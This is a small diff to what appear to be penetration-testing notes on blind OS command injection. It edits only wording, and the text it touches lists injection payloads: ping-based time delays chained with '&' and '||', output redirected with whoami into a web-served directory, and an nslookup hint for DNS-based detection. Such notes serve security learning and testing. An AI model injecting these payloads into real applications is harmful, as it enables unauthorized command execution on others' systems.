@@ -18,10 +18,10 @@ Blind OS:
 
 Most of command inj are blind, you can try :
 
--Time delay on response with     & ping -c 10 127.0.0.1 &   (10 sec delay)  or input=x||ping+-c+10+127.0.0.1||
+-Time delay on response with: & ping -c 10 127.0.0.1 &   (10 sec delay)  or input=x||ping+-c+10+127.0.0.1||
 
 -Redirecting output to a dir that you can access, like : & whoami > /var/www/static/whoami.txt &  or /var/www/images/
-and then see the output going to that file.
+Then see the output going to that file.
 You can try to access directly, or save the file in the images and change a image request and find your file.
 
 -Try nslookup:(proxy may have a whitelist for HTTP connection but might allow all DNS query)
